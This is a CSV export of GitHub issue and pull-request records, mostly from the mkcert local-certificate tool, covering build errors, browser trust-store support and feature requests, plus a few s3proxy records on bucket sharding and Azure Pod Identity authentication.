FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/29,337854233,MDExOlB1bGxSZXF1ZXN0MTk4OTI5NDUy,29,Use `go get` to build from source in the README,180032,closed,FALSE,NA,NA,1,2018-07-03T11:15:03Z,2018-07-03T21:17:40Z,2018-07-03T21:17:16Z,NONE,NA,"This automatically downloads the mkcert source code, builds it and installs the binary into `$GOPATH/bin`. This command can also be used to update an existing mkcert installation.",NA,TRUE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/29/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/29/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/29/events,https://github.com/FiloSottile/mkcert/pull/29,https://api.github.com/repos/FiloSottile/mkcert/pulls/29
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/28,337792444,MDU6SXNzdWUzMzc3OTI0NDQ=,28,"ERROR: failed to execute ""certutil -A"": exit status 255",21211512,closed,FALSE,NA,NA,3,2018-07-03T08:21:31Z,2018-07-03T12:54:08Z,2018-07-03T12:54:08Z,NONE,NA,"I follow the document steps.
The first step: mkcert -install

Created a new local CA at ""/Users/**/Library/Application Support/mkcert"" 💥
Password: ******

But it's wrong.
Error INFO:
ERROR: failed to execute ""certutil -A"": exit status 255
certutil: function failed: SEC_ERROR_LEGACY_DATABASE: The certificate/key database is in an old, unsupported format.

I don't know what to do
Ask for help, please!",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/28/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/28/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/28/events,https://github.com/FiloSottile/mkcert/issues/28,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/27,337724922,MDExOlB1bGxSZXF1ZXN0MTk4ODM0OTU2,27,docs: add CA definition as certificate authorities to help other user…,30159578,closed,FALSE,NA,NA,0,2018-07-03T02:37:08Z,2018-07-03T21:46:33Z,2018-07-03T21:46:33Z,CONTRIBUTOR,NA,…s understand the documentation and removed some redundant text for readability,NA,TRUE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/27/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/27/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/27/events,https://github.com/FiloSottile/mkcert/pull/27,https://api.github.com/repos/FiloSottile/mkcert/pulls/27
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/26,337641282,MDExOlB1bGxSZXF1ZXN0MTk4NzczMjYy,26,added simple flag to print the CAROOT var,15227649,closed,FALSE,NA,NA,1,2018-07-02T19:50:14Z,2018-07-03T21:36:49Z,2018-07-03T21:36:35Z,NONE,NA,"Issue #21
Simple flag to print rootCA.pem directory.",NA,TRUE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/26/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/26/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/26/events,https://github.com/FiloSottile/mkcert/pull/26,https://api.github.com/repos/FiloSottile/mkcert/pulls/26
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/24,337293295,MDU6SXNzdWUzMzcyOTMyOTU=,24,How to get the certs on Android?,383277,closed,FALSE,NA,NA,2,2018-07-01T14:00:14Z,2018-07-05T01:35:11Z,2018-07-04T01:07:42Z,NONE,NA,"Hi there,

sounds like an awesome tool. 
I fiddled around with CA and local certs one or two weeks ago and kind of got it working but it was a lot of work to do - you tool seems to be so much easier. 

But what I didn't manage was to get the cert accepted on my Android device so I can do local testing there. 
(Website on my computer, open to be seen from the network through IP address but via HTTPS -> needs to have an accepted cert). 
As far as I got this right, I could put the CA on my Android device and that should work. But how?

Do you have ideas for that?",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/24/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/24/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/24/events,https://github.com/FiloSottile/mkcert/issues/24,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/23,337246881,MDExOlB1bGxSZXF1ZXN0MTk4NDk2NzY0,23,Adding guide for installing mkcert on archlinux,4016501,closed,FALSE,NA,NA,4,2018-06-30T22:22:22Z,2018-07-29T13:52:23Z,2018-07-29T13:52:23Z,CONTRIBUTOR,NA,I created an AUR PKGBUILD to quickly install mkcert on ArchLinux: https://aur.archlinux.org/packages/mkcert-git/.,NA,TRUE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/23/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/23/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/23/events,https://github.com/FiloSottile/mkcert/pull/23,https://api.github.com/repos/FiloSottile/mkcert/pulls/23
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/22,337215683,MDU6SXNzdWUzMzcyMTU2ODM=,22,Make fails,170670,closed,FALSE,NA,NA,2,2018-06-30T13:40:07Z,2018-07-03T21:51:17Z,2018-07-03T21:51:17Z,NONE,NA,"I cloned the repo at commit 073ee25396d221758bcb1bb6948e299fcb2d0c1b.

When executing `make`, I get the following error:

```
GOPATH=""/root/git/mkcert/.GOPATH"" go install -v github.com/FiloSottile/mkcert
github.com/FiloSottile/mkcert
# github.com/FiloSottile/mkcert
.GOPATH/src/github.com/FiloSottile/mkcert/cert.go:67: undefined: x509.MarshalPKCS8PrivateKey
.GOPATH/src/github.com/FiloSottile/mkcert/cert.go:141: undefined: x509.MarshalPKCS8PrivateKey
Makefile:5: recipe for target 'mkcert' failed
make: *** [mkcert] Error 2
```

Am I missing some step for the installation?",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/22/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/22/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/22/events,https://github.com/FiloSottile/mkcert/issues/22,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/21,337208676,MDU6SXNzdWUzMzcyMDg2NzY=,21,Command to get the path of or copy the ca certificate,1710904,closed,FALSE,NA,NA,2,2018-06-30T11:40:07Z,2018-07-03T21:36:36Z,2018-07-03T21:36:36Z,NONE,NA,"I'm using this tool with vagrant. The services within vagrant need to communicate with each other and therefore need the ca to accept the certificates.
To add the ca I first need to get the certificate. While it is rather easy to find a command to simplify it even more would be nice.

One or both of the following might be useful:
`mkcert -capath` that just returns the path to `rootCA.pem`
`mkcert -cacopy <path>` that copies the `rootCA.pem` to `<path>`

As this tools aims to make stuff as easy as possible this might be a good addition as it takes away the extra step figuring out the path of the ca certificate.",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/21/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/21/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/21/events,https://github.com/FiloSottile/mkcert/issues/21,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/20,337181236,MDU6SXNzdWUzMzcxODEyMzY=,20,PKCS#12 support,46711,closed,FALSE,NA,NA,2,2018-06-30T03:02:31Z,2018-08-13T03:29:21Z,2018-08-13T03:29:21Z,CONTRIBUTOR,NA,"it's great tool :)  it's friendly for Golang developer.   Did you have any plan to generate PKCS12 for Java developer,  and they will execute command to convert pem to PKCS12.  command as following: 
```
openssl pkcs12 -export -in example.com.pem -inkey example.com-key.pem -out example.com.p12 -name mkcert -CAfile rootCA-key.pem -caname root
```",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/20/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/20/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/20/events,https://github.com/FiloSottile/mkcert/issues/20,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/18,337064418,MDExOlB1bGxSZXF1ZXN0MTk4MzY3OTYw,18,on linux don't declare we installed to the system store,120951,closed,FALSE,NA,NA,0,2018-06-29T16:37:09Z,2018-06-29T20:06:24Z,2018-06-29T20:02:23Z,CONTRIBUTOR,NA,,NA,TRUE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/18/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/18/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/18/events,https://github.com/FiloSottile/mkcert/pull/18,https://api.github.com/repos/FiloSottile/mkcert/pulls/18
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/17,336851340,MDU6SXNzdWUzMzY4NTEzNDA=,17,Failed to make on ubuntu 16.04LTS,33192459,closed,FALSE,NA,NA,2,2018-06-29T03:32:51Z,2018-06-29T06:17:35Z,2018-06-29T03:57:06Z,NONE,NA,"```
vincent@vincent-Inspiron-7559` Dir:~/github/mkcert → master
·····$make
GOPATH=""/home/vincent/github/mkcert/.GOPATH"" go install -v github.com/FiloSottile/mkcert
github.com/FiloSottile/mkcert
# github.com/FiloSottile/mkcert
.GOPATH/src/github.com/FiloSottile/mkcert/cert.go:67:18: undefined: x509.MarshalPKCS8PrivateKey
.GOPATH/src/github.com/FiloSottile/mkcert/cert.go:141:18: undefined: x509.MarshalPKCS8PrivateKey
Makefile:5: recipe for target 'covfefe' failed
make: *** [covfefe] Error 2
```",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/17/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/17/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/17/events,https://github.com/FiloSottile/mkcert/issues/17,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/16,336706351,MDExOlB1bGxSZXF1ZXN0MTk4MDk1NzUy,16,Update cert.go,16728082,closed,FALSE,NA,NA,0,2018-06-28T17:10:11Z,2018-06-28T17:13:09Z,2018-06-28T17:11:06Z,NONE,NA,"To export public key 
I need passphrase.",NA,TRUE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/16/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/16/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/16/events,https://github.com/FiloSottile/mkcert/pull/16,https://api.github.com/repos/FiloSottile/mkcert/pulls/16
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/15,336663555,MDExOlB1bGxSZXF1ZXN0MTk4MDYyNjE0,15,linux: support chrome via nss/certutil,120951,closed,FALSE,NA,NA,6,2018-06-28T15:10:01Z,2018-07-05T14:35:28Z,2018-07-04T02:27:20Z,CONTRIBUTOR,NA,Issue: https://github.com/FiloSottile/mkcert/issues/11,NA,TRUE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/15/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/15/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/15/events,https://github.com/FiloSottile/mkcert/pull/15,https://api.github.com/repos/FiloSottile/mkcert/pulls/15
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/14,336653041,MDU6SXNzdWUzMzY2NTMwNDE=,14,support installing arbitrary cert/ca ,120951,closed,FALSE,NA,NA,1,2018-06-28T14:45:47Z,2018-07-03T23:54:37Z,2018-07-03T23:54:36Z,CONTRIBUTOR,NA,"Many companies have internal CAs and wish for them to be installed. If `-install` took a certificate that would allow operators a ""one command"" type install. 

```
$ mkcert -install company-ca.pem 

$ cat company-ca.pem | mkcert -install
```",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/14/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/14/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/14/events,https://github.com/FiloSottile/mkcert/issues/14,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/13,336652078,MDExOlB1bGxSZXF1ZXN0MTk4MDUzNzky,13,firefox: prefer cert9.db and skip that profile after,120951,closed,FALSE,NA,NA,2,2018-06-28T14:43:26Z,2018-07-12T17:50:17Z,2018-07-12T17:47:06Z,CONTRIBUTOR,NA,Issue: https://github.com/FiloSottile/mkcert/issues/12,NA,TRUE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/13/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/13/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/13/events,https://github.com/FiloSottile/mkcert/pull/13,https://api.github.com/repos/FiloSottile/mkcert/pulls/13
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/12,336581225,MDU6SXNzdWUzMzY1ODEyMjU=,12,"failed to execute ""certutil -A""",21371842,closed,FALSE,NA,NA,15,2018-06-28T11:26:06Z,2018-07-12T15:59:42Z,2018-07-04T16:59:34Z,NONE,NA,"This error appears when i do ""mkcert -install""

>ERROR: failed to execute ""certutil -A"": exit status 255
>
>certutil: function failed: SEC_ERROR_LEGACY_DATABASE: The certificate/key database is in an old, unsupported format.",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/12/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/12/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/12/events,https://github.com/FiloSottile/mkcert/issues/12,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/11,336511915,MDU6SXNzdWUzMzY1MTE5MTU=,11,Installing certs for Firefox/Chromium on Linux,123276,closed,FALSE,NA,NA,1,2018-06-28T07:53:18Z,2018-07-04T02:28:40Z,2018-07-04T02:27:20Z,NONE,NA,"Hi, while I don't have a use case for `mkcert`, I've just recently written a shell script which inserts a CA into all browser profiles for a user, and I thought I just leave some hints here:
 * For Firefox, the cert needs to be inserted into each NSS db in each profile directory within `~/.mozilla/firefox`, using `certutil`. The code in `truststore_firefox.go` looks good already
 * For Chromium (and probably also Chrome), there's a central NSS db in `~/.pki/nssdb` into which the certificate can be added via `certutil`, very similar to Firefox

That should do the trick for Linux for the most widely used browsers at least (which should cover like 90% of the use cases out there).

Adding the certificate to the system's trust store depends on the Linux distribution, it's a lot more complex. For Fedora, the browsers also trust certificates in the system-wide trust store in `/etc`, on Debian that's not the case: browsers just ignore all system ca certificates.",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/11/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/11/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/11/events,https://github.com/FiloSottile/mkcert/issues/11,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/10,336483850,MDU6SXNzdWUzMzY0ODM4NTA=,10,NSS DB issue,890105,closed,FALSE,NA,NA,1,2018-06-28T06:04:18Z,2018-06-28T06:10:29Z,2018-06-28T06:10:15Z,NONE,NA,"Since [NSS 3.35](https://developer.mozilla.org/en-US/docs/Mozilla/Projects/NSS/NSS_3.35_release_notes) sql is the default DB. So this breaks depending on the NSS version you use.

https://github.com/FiloSottile/mkcert/blob/443e5b338540eddca2fe1584216d877170201bf6/truststore_firefox.go#L79-L80

https://github.com/FiloSottile/mkcert/blob/443e5b338540eddca2fe1584216d877170201bf6/truststore_firefox.go#L83-L84",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/10/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/10/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/10/events,https://github.com/FiloSottile/mkcert/issues/10,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/9,336449732,MDU6SXNzdWUzMzY0NDk3MzI=,9,Use cgo and Security.framework instead of shelling out to security on macOS,1225294,closed,FALSE,NA,NA,1,2018-06-28T02:22:29Z,2018-06-28T02:48:21Z,2018-06-28T02:48:21Z,OWNER,NA,"This is low priority, but it would be cleaner to use cgo like in root_cgo_darwin.go in crypto/x509.

We will probably have to keep the current code as a nocgo fallback though.",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/9/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/9/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/9/events,https://github.com/FiloSottile/mkcert/issues/9,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/8,336444158,MDU6SXNzdWUzMzY0NDQxNTg=,8,Punycode support,1225294,closed,FALSE,NA,NA,0,2018-06-28T01:47:09Z,2018-06-28T05:46:30Z,2018-06-28T05:46:30Z,OWNER,NA,,NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/8/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/8/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/8/events,https://github.com/FiloSottile/mkcert/issues/8,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/7,336410479,MDU6SXNzdWUzMzY0MTA0Nzk=,7,Installation issue,10766808,closed,FALSE,NA,NA,1,2018-06-27T22:32:00Z,2018-06-27T23:06:45Z,2018-06-27T23:06:45Z,NONE,NA,"After running command `make` on Ubuntu 14.04 and `go1.2.1 linux/amd64` I get:
```
mkdir -p "".GOPATH/src/github.com/FiloSottile/mkcert""
rmdir "".GOPATH/src/github.com/FiloSottile/mkcert""
ln -s ../../../.. "".GOPATH/src/github.com/FiloSottile/mkcert""
mkdir -p bin
ln -s ../bin .GOPATH/bin
touch .GOPATH/.ok
GOPATH=""/tmp/mkcert/.GOPATH"" go install -v github.com/FiloSottile/mkcert
github.com/FiloSottile/mkcert
# github.com/FiloSottile/mkcert
.GOPATH/src/github.com/FiloSottile/mkcert/main.go:160: undefined: x509.MarshalPKCS8PrivateKey
.GOPATH/src/github.com/FiloSottile/mkcert/main.go:233: undefined: x509.MarshalPKCS8PrivateKey
make: *** [covfefe] Error 2
```",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/7/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/7/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/7/events,https://github.com/FiloSottile/mkcert/issues/7,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/6,336286425,MDU6SXNzdWUzMzYyODY0MjU=,6,Firefox Support?,129784,closed,FALSE,NA,NA,7,2018-06-27T15:46:42Z,2020-05-20T10:20:46Z,2018-06-28T05:29:53Z,NONE,NA,"This works flawlessly with Chrome, Safari, & Opera - so thank you for that.

Firefox doesn't seem to trust the issuer - I can add an exception to Firefox as a workaround (which I've done in the past for local cert authorities) 

```
test.vm uses an invalid security certificate. 
The certificate is not trusted because the issuer certificate is unknown. 
The server might not be sending the appropriate intermediate certificates. 
An additional root certificate may need to be imported. 
Error code: SEC_ERROR_UNKNOWN_ISSUER


Peer’s Certificate issuer is not recognized. 
HTTP Strict Transport Security: false 
HTTP Public Key Pinning: false 
```

would be happy to supply more details if needed, 

rootCA is installed on my host machine (OSX) and is in a NFS mounted folder shared with a vagrant Centos7/Apache 2.4.6 box 

",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/6/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/6/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/6/events,https://github.com/FiloSottile/mkcert/issues/6,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/5,335784709,MDExOlB1bGxSZXF1ZXN0MTk3Mzk2ODEy,5,Explicitly set 0 length path constraint,967561,closed,FALSE,NA,NA,1,2018-06-26T11:57:02Z,2018-06-28T02:28:24Z,2018-06-28T02:28:24Z,CONTRIBUTOR,NA,Signed-off-by: Patrick Uiterwijk <patrick@puiterwijk.org>,NA,TRUE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/5/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/5/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/5/events,https://github.com/FiloSottile/mkcert/pull/5,https://api.github.com/repos/FiloSottile/mkcert/pulls/5
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/4,335782600,MDExOlB1bGxSZXF1ZXN0MTk3Mzk1MjE3,4,Use PKCS1 encoding to be compatible with Go 1.9,967561,closed,FALSE,NA,NA,2,2018-06-26T11:50:40Z,2018-06-28T01:59:42Z,2018-06-28T01:59:42Z,CONTRIBUTOR,NA,Signed-off-by: Patrick Uiterwijk <patrick@puiterwijk.org>,NA,TRUE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/4/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/4/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/4/events,https://github.com/FiloSottile/mkcert/pull/4,https://api.github.com/repos/FiloSottile/mkcert/pulls/4
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/3,335781515,MDExOlB1bGxSZXF1ZXN0MTk3Mzk0MzY0,3,Fix permissions on newly generated private keys,967561,closed,FALSE,NA,NA,1,2018-06-26T11:47:08Z,2018-06-28T02:18:34Z,2018-06-28T02:18:33Z,CONTRIBUTOR,NA,Signed-off-by: Patrick Uiterwijk <patrick@puiterwijk.org>,NA,TRUE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/3/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/3/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/3/events,https://github.com/FiloSottile/mkcert/pull/3,https://api.github.com/repos/FiloSottile/mkcert/pulls/3
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/2,335682526,MDExOlB1bGxSZXF1ZXN0MTk3MzE5NDQ3,2,"Add Linux support for update-ca-trust and update-ca-certificates (RHEL, CentOS, Fedora, Debian, Ubuntu...)",131994,closed,FALSE,NA,NA,6,2018-06-26T06:55:45Z,2018-07-04T02:46:45Z,2018-07-04T02:46:40Z,CONTRIBUTOR,NA,"Hmm, are there any better tools than ""tee"" to install files using sudo? :)",NA,TRUE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/2/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/2/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/2/events,https://github.com/FiloSottile/mkcert/pull/2,https://api.github.com/repos/FiloSottile/mkcert/pulls/2
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/1,335680732,MDU6SXNzdWUzMzU2ODA3MzI=,1,Wildcard Cert Support,2754700,closed,FALSE,NA,NA,2,2018-06-26T06:48:48Z,2018-07-03T12:42:10Z,2018-06-28T04:29:28Z,NONE,NA,"Hey Filippo,
Thanks for putting together this tool -- I hacked a solution for this use case on Windows before and it was not easy to do.

The first thing I tried was to create a wildcard cert:
```
ERROR: ""*.test.com"" is not a valid hostname or IP
```

This regex doesn't allow asterisks which is at least part of the issue:
https://github.com/FiloSottile/mkcert/blob/master/main.go#L104

Should we support this?

Cheers! 🦄",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/1/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/1/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/1/events,https://github.com/FiloSottile/mkcert/issues/1,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/354,853161299,MDExOlB1bGxSZXF1ZXN0NjExMjk0Mjky,354,Add Sharded Bucket middleware,703870,open,FALSE,NA,NA,0,2021-04-08T07:30:30Z,2021-04-09T17:55:35Z,NA,CONTRIBUTOR,NA,"Adds the sharded bucket middleware, which allows for splitting objects
across multiple backend buckets for a given virtual bucket. The
middleware should be configured as:
```
s3proxy.sharded-blobstore.<bucket name>.shards=<number of shards>
s3proxy.sharded-blobstore.<bucket name>.prefix=<prefix>
```

All shards are named <prefix>-<index>, where index is an
integer from 0 to <number of shards> - 1. If the <prefix> is not
supplied, the <bucket name> is used as the prefix.

Listing the virtual bucket and multipart uploads are not supported. When
listing all containers, the shards are elided from the result.",NA,TRUE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/354/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/354/comments,https://api.github.com/repos/gaul/s3proxy/issues/354/events,https://github.com/gaul/s3proxy/pull/354,https://api.github.com/repos/gaul/s3proxy/pulls/354
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/353,849780446,MDU6SXNzdWU4NDk3ODA0NDY=,353,Return full stack trace on unexpected errors,848247,open,FALSE,NA,NA,0,2021-04-04T02:17:54Z,2021-04-04T02:17:54Z,NA,OWNER,NA,"In #352 a user reported an error with this HTTP error:

```
<h2>HTTP ERROR: 400</h2>
<p>Problem accessing /. Reason:
<pre>    com.google.common.io.BaseEncoding$DecodingException: Unrecognized character: .</pre></p>
```

S3Proxy should return the full stack trace to make debugging easier.",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/353/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/353/comments,https://api.github.com/repos/gaul/s3proxy/issues/353/events,https://github.com/gaul/s3proxy/issues/353,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/352,849314283,MDU6SXNzdWU4NDkzMTQyODM=,352,Cannot use S3Proxy with Azure Pod Identities,2606303,open,FALSE,NA,NA,1,2021-04-02T16:16:59Z,2021-04-04T02:12:13Z,NA,NONE,NA,"We are trying to deploy S3Proxy in a Kubernetes cluster on AKS in order to translate AWS S3-compatible requests performed by our own software to Azure Blob Storage requests. Even though passing an Azure storage account token to the `JCLOUDS_CREDENTIAL` variable works, we are having trouble authenticating using Azure Pod Identity credentials.

In a nutshell, Pod Identities allow pods running in an AKS cluster to retrieve a JWT from the Azure Instance Metadata Service and use it to assume a managed identity when accessing Azure services. We want to use this feature because it allows assigning fine-grained permissions to services running in the AKS cluster, and is considered best practice for applications running on AKS. See more information here:

https://docs.microsoft.com/en-us/azure/aks/use-azure-ad-pod-identity
https://docs.microsoft.com/en-us/azure/aks/operator-best-practices-identity#use-pod-managed-identities

When trying to use this feature in combination with S3Proxy, we faced the following two problems:

1. S3Proxy does not automatically retrieve and refresh Pod Identity credentials from the metadata service. This is a problem because these credentials are short-lived, and are expected to be refreshed regularly by the application.

2. When passing a Pod Identity token retrieved from the metadata service to S3Proxy via the `JCLOUDS_CREDENTIAL` variable, requests towards S3Proxy fail with the following error:

   ```HTML
   <html>
   <head>
   <meta http-equiv=""Content-Type"" content=""text/html;charset=ISO-8859-1""/>
   <title>Error 400 </title>
   </head>
   <body>
   <h2>HTTP ERROR: 400</h2>
   <p>Problem accessing /. Reason:
   <pre>    com.google.common.io.BaseEncoding$DecodingException: Unrecognized character: .</pre></p>
   <hr /><i><small>Powered by Jetty://</small></i>
   </body>
   </html>
   ```

   What we think is happening is that jclouds is trying to base64 decode the Pod Identity token in order to sign the request. However, since this token is a JWT, decoding fails with the above error once it encounters the first dot.

Is there any way to overcome these problems and use S3Proxy with Pod Identities right now? Is there any plan to add support for them in the future?",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/352/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/352/comments,https://api.github.com/repos/gaul/s3proxy/issues/352/events,https://github.com/gaul/s3proxy/issues/352,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/351,845880637,MDU6SXNzdWU4NDU4ODA2Mzc=,351,Middleware to shard objects across a configurable number of buckets,703870,open,FALSE,NA,NA,3,2021-03-31T05:05:02Z,2021-04-08T07:26:30Z,NA,CONTRIBUTOR,NA,Some object store providers impose rate limits or perform poorly as the number of objects in a bucket exceeds certain amounts. It would be great to have a middleware in S3Proxy that shards content across a configurable number of buckets and presents a virtual bucket to the end user.,NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/351/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/351/comments,https://api.github.com/repos/gaul/s3proxy/issues/351/events,https://github.com/gaul/s3proxy/issues/351,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/350,845686857,MDU6SXNzdWU4NDU2ODY4NTc=,350,Compounding middleware for WAN optimization,848247,open,FALSE,NA,NA,0,2021-03-31T02:30:36Z,2021-03-31T02:30:48Z,NA,OWNER,NA,"One of the slowest s3fs operations is `readdir` which requires ListObjects followed by a HeadObject for each object.  S3Proxy could improve performance over WANs by locating an S3Proxy instance closer to the object store.  Thus the HeadObject latency would reduce and S3Proxy could return a single response including user metadata to the client.  This would require some client changes to realize the gains.

